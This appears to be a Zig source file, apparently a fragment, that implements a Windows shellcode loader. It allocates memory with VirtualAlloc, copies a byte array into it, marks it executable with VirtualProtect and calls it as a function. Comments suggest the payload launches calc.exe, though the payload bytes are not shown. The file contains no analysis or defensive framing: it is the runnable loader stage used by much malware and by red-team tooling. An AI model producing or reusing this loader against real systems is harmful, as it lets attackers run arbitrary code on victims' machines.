// Memory allocation constants
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

// extern function declaration for VirtualAlloc and VirtualProtect
extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn VirtualProtect(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flNewProtect: u32,
    lpflOldProtect: *u32,
) callconv(.winapi) i32;

extern "kernel32" fn VirtualFree(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    dwFreeType: u32,
) callconv(.winapi) i32;

pub fn main() !void {
    std.debug.print("Starting shellcode execution...\n", .{});
    
    // Execute shellcode from RO_DATA (read-only section)
    // We need to pass it as a slice
    const shellcode_slice = R_DATA[0..];
    try execute_shellcode(shellcode_slice);
}

fn execute_shellcode(shellcode: []const u8) !void {
    // Allocate executable memory
    const exec_mem = VirtualAlloc(
        null,
        shellcode.len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,  // Allocate with RW first
    );
    
    if (exec_mem == null) {
        std.debug.print("VirtualAlloc failed! Error: {}\n", .{win.GetLastError()});
        return error.AllocationFailed;
    }
    
    std.debug.print("Memory allocated at: 0x{X}\n", .{@intFromPtr(exec_mem)});
    
    // Copy shellcode to allocated memory
    const dest = @as([*]u8, @ptrCast(exec_mem));
    @memcpy(dest[0..shellcode.len], shellcode);    
    // Change memory protection to executable
    var old_protect: u32 = 0;
    const protect_result = VirtualProtect(
        exec_mem,
        shellcode.len,
        PAGE_EXECUTE_READ,  // Change to RX (remove write)
        &old_protect,
    );
    
    if (protect_result == 0) {
        std.debug.print("VirtualProtect failed! Error: {}\n", .{win.GetLastError()});
        _ = VirtualFree(exec_mem, 0, 0x8000); // MEM_RELEASE
        return error.ProtectFailed;
    }
    
    std.debug.print("Memory protection changed to RX, executing shellcode...\n", .{});
    
    // Cast to function pointer and execute
    const func = @as(*const fn () callconv(.winapi) void, @ptrCast(exec_mem));
    func();
    
    // If shellcode returns (unlikely for calc.exe), clean up
    std.debug.print("Shellcode returned, cleaning up...\n", .{});
    _ = VirtualFree(exec_mem, 0, 0x8000); // MEM_RELEASE
}
